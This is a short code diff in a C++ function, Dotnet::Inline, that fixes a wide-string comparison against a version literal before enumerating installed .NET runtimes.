@@ -53,7 +53,7 @@ auto DECLFN Dotnet::Inline(
     );
     if ( HResult ) goto _KH_END;
 
-    if ( Version == L"v0.0.00000" ) {
+    if ( ( Str::CompareW( Version, L"v0.0.00000" ) == 0 ) ) {
         HResult = MetaHost->EnumerateInstalledRuntimes( &EnumUkwn );
         if ( HResult ) goto _KH_END;
 
